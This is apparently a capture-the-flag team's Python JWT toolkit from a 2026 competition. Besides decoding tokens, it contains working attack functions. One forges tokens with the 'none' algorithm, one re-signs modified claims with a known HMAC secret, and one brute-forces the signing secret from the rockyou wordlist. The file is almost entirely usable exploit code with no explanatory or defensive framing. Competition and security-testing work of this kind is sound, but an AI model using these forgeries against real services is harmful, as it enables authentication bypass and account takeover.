#!/usr/bin/env python3
"""
InCTF 2026 Finals — JWT Toolkit
TEAM_UNFINDABLES (FIN-030)
"""
import json, base64, hmac, hashlib, sys

def b64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def decode_jwt(token):
    parts = token.split('.')
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    print(f"Header:  {json.dumps(header, indent=2)}")
    print(f"Payload: {json.dumps(payload, indent=2)}")
    return header, payload

def forge_none(token, new_payload=None):
    """Algorithm None attack."""
    parts = token.split('.')
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    header['alg'] = 'none'
    if new_payload:
        payload.update(new_payload)
    h = b64url_encode(json.dumps(header))
    p = b64url_encode(json.dumps(payload))
    return f"{h}.{p}."

def forge_hs256(token, secret, new_payload=None):
    """Forge JWT with known HMAC secret."""
    parts = token.split('.')
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    header['alg'] = 'HS256'
    if new_payload:
        payload.update(new_payload)
    h = b64url_encode(json.dumps(header))
    p = b64url_encode(json.dumps(payload))
    sig = b64url_encode(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"

def crack_jwt_secret(token, wordlist=None):
    """Brute-force JWT HMAC secret."""
    parts = token.split('.')
    msg = f"{parts[0]}.{parts[1]}".encode()
    sig = b64url_decode(parts[2])
    if wordlist is None:
        wordlist = '/usr/share/wordlists/rockyou.txt'
    with open(wordlist, 'r', errors='ignore') as f:
        for word in f:
            word = word.strip()
            if hmac.new(word.encode(), msg, hashlib.sha256).digest() == sig:
                print(f"[+] Secret: {word}")
                return word
    print("[-] Secret not found")
    return None

if __name__ == "__main__":
    if len(sys.argv) > 1:
        decode_jwt(sys.argv[1])
    else:
        print("JWT Toolkit — Usage: python3 jwt_toolkit.py <token>")
